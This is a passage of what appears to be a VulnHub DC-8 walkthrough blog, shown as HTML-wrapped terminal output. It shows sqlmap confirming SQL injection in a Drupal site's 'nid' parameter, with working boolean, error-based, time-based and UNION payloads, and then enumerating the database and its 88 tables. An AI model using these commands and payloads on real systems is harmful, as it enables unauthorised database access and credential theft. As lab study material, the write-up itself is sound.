class="line">[20:57:11] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or <span class="keyword">in</span> <span class="keyword">case</span> of junk results, refer to user<span class="string">&#x27;s manual paragraph &#x27;</span>Page comparison<span class="string">&#x27;</span></span><br><span class="line"><span class="string">how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] </span></span><br><span class="line"><span class="string">[20:57:13] [INFO] testing if GET parameter &#x27;</span>nid<span class="string">&#x27; is dynamic</span></span><br><span class="line"><span class="string">[20:57:14] [WARNING] GET parameter &#x27;</span>nid<span class="string">&#x27; does not appear to be dynamic</span></span><br><span class="line"><span class="string">[20:57:14] [INFO] heuristic (basic) test shows that GET parameter &#x27;</span>nid<span class="string">&#x27; might be injectable (possible DBMS: &#x27;</span>MySQL<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">[20:57:14] [INFO] testing for SQL injection on GET parameter &#x27;</span>nid<span class="string">&#x27;</span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;</span>MySQL<span class="string">&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] n</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;</span>MySQL<span class="string">&#x27; extending provided level (1) and risk (1) values? [Y/n] y</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] GET parameter &#x27;</span>nid<span class="string">&#x27; appears to be &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27; injectable (with --string=&quot;Status message&quot;)</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>Generic inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [WARNING] potential permission problems detected (&#x27;</span><span class="built_in">command</span> denied<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] GET parameter &#x27;</span>nid<span class="string">&#x27; is &#x27;</span>MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)<span class="string">&#x27; injectable </span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                      </span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &lt; 5.0.12 stacked queries (heavy query - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &lt; 5.0.12 stacked queries (heavy query)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:40] [INFO] GET parameter &#x27;</span>nid<span class="string">&#x27; appears to be &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27; injectable </span></span><br><span class="line"><span class="string">[20:57:40] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[20:57:40] [INFO] &#x27;</span>ORDER BY<span class="string">&#x27; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span></span><br><span class="line"><span class="string">[20:57:40] [INFO] target URL appears to have 1 column in query</span></span><br><span class="line"><span class="string">[20:57:41] [INFO] GET parameter &#x27;</span>nid<span class="string">&#x27; is &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">GET parameter &#x27;</span>nid<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: nid (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND 2744=2744</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 3788 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(3788=3788,1))),0x716a6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 8090 FROM (SELECT(SLEEP(5)))vgpi)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: nid=-6424 UNION ALL SELECT CONCAT(0x7162766b71,0x756e745669426f51657542734855636c72567a796d6a4f4f4642425451696b77557152776b6f616c,0x716a6a7671)-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[20:57:48] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span></span><br><span class="line"><span class="string">[20:57:48] [INFO] fetching database names</span></span><br><span class="line"><span class="string">[20:57:48] [INFO] retrieved: &#x27;</span>d7db<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:48] [INFO] retrieved: &#x27;</span>information_schema<span class="string">&#x27;</span></span><br><span class="line"><span class="string">available databases [2]:                                                                                                                         </span></span><br><span class="line"><span class="string">[*] d7db</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:57:48] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 25 times</span></span><br><span class="line"><span class="string">[20:57:48] [INFO] fetched data logged to text files under &#x27;</span>/root/.<span class="built_in">local</span>/share/sqlmap/output/192.168.1.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 20:57:48 /2020-08-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc8# </span></span><br></pre></td></tr></table></figure><h2 id="0x05-çˆ†è¡¨"><a href="#0x05-çˆ†è¡¨" class="headerlink" title="0x05.çˆ†è¡¨"></a>0x05.çˆ†è¡¨</h2><p><code>å®šä½åˆ°usersè¡¨</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># sqlmap -u &quot;http://192.168.1.3/?nid=2&quot; -D &quot;d7db&quot; --tables</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.4.8#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [(]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 20:59:52 /2020-08-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:59:53] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[20:59:53] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: nid (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND 2744=2744</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 3788 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(3788=3788,1))),0x716a6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 8090 FROM (SELECT(SLEEP(5)))vgpi)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: nid=-6424 UNION ALL SELECT CONCAT(0x7162766b71,0x756e745669426f51657542734855636c72567a796d6a4f4f4642425451696b77557152776b6f616c,0x716a6a7671)-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] fetching tables for database: &#x27;d7db&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;actions&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;authmap&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;batch&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;block&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;block_custom&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;block_node_type&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;block_role&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;blocked_ips&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_block&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_bootstrap&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_field&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_filter&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_form&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_image&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_menu&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_page&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_path&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_views&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_views_data&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;ckeditor_input_format&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;ckeditor_settings&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;ctools_css_cache&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;ctools_object_cache&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;date_format_locale&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;date_format_type&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;date_formats&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_config&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_config_instance&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_data_body&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_data_field_image&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_data_field_tags&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_revision_body&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_revision_field_image&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_revision_field_tags&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;file_managed&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;file_usage&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;filter&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;filter_format&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;flood&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;history&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;image_effects&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;image_styles&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;menu_custom&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;menu_links&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;menu_router&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;node&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;node_access&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;node_revision&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;node_type&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;queue&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;rdf_mapping&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;registry&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;registry_file&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;role&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;role_permission&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;search_dataset&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;search_index&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;search_node_links&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;search_total&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;semaphore&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;sequences&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;sessions&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;shortcut_set&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;shortcut_set_users&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;site_messages_table&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;system&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;taxonomy_index&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;taxonomy_term_data&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;taxonomy_term_hierarchy&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;taxonomy_vocabulary&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;url_alias&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;users&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;users_roles&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;variable&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;views_display&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;views_view&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;watchdog&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_component&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_conditional&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_conditional_actions&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_conditional_rules&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_emails&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_last_download&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_roles&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_submissions&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_submitted_data&#x27;</span></span><br><span class="line"><span class="string">Database: d7db                                                                                                                                   </span></span><br><span class="line"><span class="string">[88 tables]</span></span><br><span class="line"><span class="string">+-----------------------------+</span></span><br><span class="line"><span class="string">| filter                      |</span></span><br><span class="line"><span class="string">| system                      |</span></span><br><span class="line"><span class="string">| actions                     |</span></span><br><span class="line"><span class="string">| authmap                     |</span></span><br><span class="line"><span class="string">| batch                       |</span></span><br><span class="line"><span class="string">| block                       |</span></span><br><span class="line"><span class="string">| block_custom                |</span></span><br><span class="line"><span class="string">| block_node_type             |</span></span><br><span class="line"><span class="string">| block_role                  |</span></span><br><span class="line"><span class="string">| blocked_ips                 |</span></span><br><span class="line"><span class="string">| cache                       |</span></span><br><span class="line"><span class="string">| cache_block                 |</span></span><br><span class="line"><span class="string">| cache_bootstrap             |</span></span><br><span class="line"><span class="string">| cache_field                 |</span></span><br><span class="line"><span class="string">| cache_filter                |</span></span><br><span class="line"><span class="string">| cache_form                  |</span></span><br><span class="line"><span class="string">| cache_image                 |</span></span><br><span class="line"><span class="string">| cache_menu                  |</span></span><br><span class="line"><span class="string">| cache_page                  |</span></span><br><span class="line"><span class="string">| cache_path                  |</span></span><br><span class="line"><span class="string">| cache_views                 |</span></span><br><span class="line"><span class="string">| cache_views_data            |</span></span><br><span class="line"><span class="string">| ckeditor_input_format       |</span></span><br><span class="line"><span class="string">| ckeditor_settings           |</span></span><br><span class="line"><span class="string">| ctools_css_cache            |</span></span><br><span class="line"><span class="string">| ctools_object_cache         |</span></span><br><span class="line"><span class="string">| date_format_locale          |</span></span><br><span class="line"><span class="string">| date_format_type            |</span></span><br><span class="line"><span class="string">| date_formats                |</span></span><br><span class="line"><span class="string">| field_config                |</span></span><br><span class="line"><span class="string">| field_config_instance       |</span></span><br><span class="line"><span class="string">| field_data_body             |</span></span><br><span class="line"><span class="string">| field_data_field_image      |</span></span><br><span class="line"><span class="string">| field_data_field_tags       |</span></span><br><span class="line"><span class="string">| field_revision_body         |</span></span><br><span class="line"><span class="string">| field_revision_field_image  |</span></span><br><span class="line"><span class="string">| field_revision_field_tags   |</span></span><br><span class="line"><span class="string">| file_managed                |</span></span><br><span class="line"><span class="string">| file_usage                  |</span></span><br><span class="line"><span class="string">| filter_format               |</span></span><br><span class="line"><span class="string">| flood                       |</span></span><br><span class="line"><span class="string">| history                     |</span></span><br><span class="line"><span class="string">| image_effects               |</span></span><br><span class="line"><span class="string">| image_styles                |</span></span><br><span class="line"><span class="string">| menu_custom                 |</span></span><br><span class="line"><span class="string">| menu_links                  |</span></span><br><span class="line"><span class="string">| menu_router                 |</span></span><br><span class="line"><span class="string">| node                        |</span></span><br><span class="line"><span class="string">| node_access                 |</span></span><br><span class="line"><span class="string">| node_revision               |</span></span><br><span class="line"><span class="string">| node_type                   |</span></span><br><span class="line"><span class="string">| queue                       |</span></span><br><span class="line"><span class="string">| rdf_mapping                 |</span></span><br><span class="line"><span class="string">| registry                    |</span></span><br><span class="line"><span class="string">| registry_file               |</span></span><br><span class="line"><span class="string">| role                        |</span></span><br><span class="line"><span class="string">| role_permission             |</span></span><br><span class="line"><span class="string">| search_dataset              |</span></span><br><span class="line"><span class="string">| search_index                |</span></span><br><span class="line"><span class="string">| search_node_links           |</span></span><br><span class="line"><span class="string">| search_total                |</span></span><br><span class="line"><span class="string">| semaphore                   |</span></span><br><span class="line"><span 